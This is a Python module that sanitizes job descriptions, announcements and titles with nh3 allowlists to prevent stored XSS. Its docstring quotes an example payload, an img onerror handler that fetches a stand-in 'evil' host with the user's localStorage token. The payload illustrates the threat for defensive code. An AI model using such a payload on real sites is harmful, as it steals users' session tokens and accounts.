"""Allowlist sanitization for the rich text this platform stores and renders.

Job descriptions, training-programme descriptions and announcements are
written by companies, administrators and a JobStreet scraper, then rendered
with ``dangerouslySetInnerHTML``. Without sanitization that is stored XSS: a
company posting ``<img src=x onerror=fetch('//evil/?t='+localStorage.token)>``
in a job description runs script in every student's browser that opens the
listing, and this application keeps its JWTs in localStorage, so the payload
can take the account.

Sanitization happens **on the way in**, so the database never holds an
executable payload and every consumer -- the React pages, a future export, an
email digest -- is safe by construction rather than by remembering to escape.
The frontend sanitizes again before rendering; two independent passes, because
either one alone is a single point of failure and rows predating this module
have not been through the first.

The allowlist is deliberately small. It covers what a job advert or an
announcement actually needs -- headings, paragraphs, lists, emphasis, links,
tables -- and nothing that can execute: no ``script``, ``style``, ``iframe``,
``object``, ``embed``, ``form``, ``svg`` or ``math``, no ``on*`` handler
attributes, and no ``javascript:``/``data:`` URLs.

nh3 is the Python binding to the Rust `ammonia` sanitizer: a parse-then-
serialize allowlist filter, not a regex over markup. Regex-based stripping is
the classic way to ship a sanitizer that looks right and is bypassable.
"""

import html

import nh3

#: Tags a description or announcement legitimately uses.
ALLOWED_TAGS = {
    "p", "br", "hr", "div", "span",
    "h1", "h2", "h3", "h4", "h5", "h6",
    "strong", "b", "em", "i", "u", "s", "sub", "sup", "small", "mark",
    "ul", "ol", "li", "dl", "dt", "dd",
    "blockquote", "pre", "code",
    "a",
    "table", "thead", "tbody", "tfoot", "tr", "th", "td", "caption",
}

#: Attributes, per tag. No ``style`` anywhere: it carries its own injection
#: surface, and the platform's own CSS controls presentation.
#: ``rel`` is deliberately absent from the ``a`` set: nh3 writes it itself
#: from ``link_rel`` below, and allowing both is an error. That also means an
#: author cannot strip the ``noopener`` the sanitizer adds.
ALLOWED_ATTRIBUTES = {
    "a": {"href", "title", "target"},
    "th": {"colspan", "rowspan", "scope"},
    "td": {"colspan", "rowspan"},
    "ol": {"start"},
    "*": {"class"},
}

#: Only schemes that cannot execute. ``javascript:`` is the obvious one;
#: ``data:`` is excluded because ``data:text/html`` runs script in a top-level
#: navigation, and no legitimate advert needs it.
ALLOWED_URL_SCHEMES = {"http", "https", "mailto", "tel"}

#: Content of these is dropped entirely rather than unwrapped: unwrapping
#: ``<script>alert(1)</script>`` would leave the visible text "alert(1)" in
#: the middle of a job description.
STRIP_WITH_CONTENT = {"script", "style", "iframe", "object", "embed", "noscript"}


def sanitize_html(value):
    """Return ``value`` reduced to the allowlist. Never returns None.

    Safe to call on already-sanitized text: sanitizing is idempotent, so a
    re-save does not progressively mangle the content.
    """
    if not value:
        return ""
    return nh3.clean(
        str(value),
        tags=ALLOWED_TAGS,
        attributes={tag: set(attrs) for tag, attrs in ALLOWED_ATTRIBUTES.items()},
        url_schemes=ALLOWED_URL_SCHEMES,
        clean_content_tags=STRIP_WITH_CONTENT,
        link_rel="noopener noreferrer",
        strip_comments=True,
    )


#: A tag-stripping pass can reveal markup that was entity-encoded, so the
#: strip/unescape cycle repeats. Two rounds cover every case seen in practice;
#: the bound is here so a hostile input cannot spin it.
TEXT_UNESCAPE_ROUNDS = 3


def sanitize_text(value):
    """Reduce to plain text, for fields that carry no markup.

    A job title, a company name or a skill name has no reason to contain
    markup, and rendering one inside a heading should never depend on the
    template escaping correctly.

    The result is *text*, not HTML: entities are decoded back to the
    characters they stand for. That matters because these values are rendered
    by React as text nodes, which escape on output -- leaving them encoded
    would show a student the literal "R&amp;D Software Engineer", and 42 of
    the scraped job titles contain an ampersand.

    Stripping and unescaping alternate until the value stops changing, so
    markup hidden behind an entity ("&lt;script&gt;") is removed rather than
    revealed by the last step.
    """
    if not value:
        return ""

    text = str(value)
    for _ in range(TEXT_UNESCAPE_ROUNDS):
        stripped = html.unescape(
            nh3.clean(text, tags=set(), attributes={},
                      clean_content_tags=STRIP_WITH_CONTENT,
                      strip_comments=True)
        )
        if stripped == text:
            break
        text = stripped
    return text
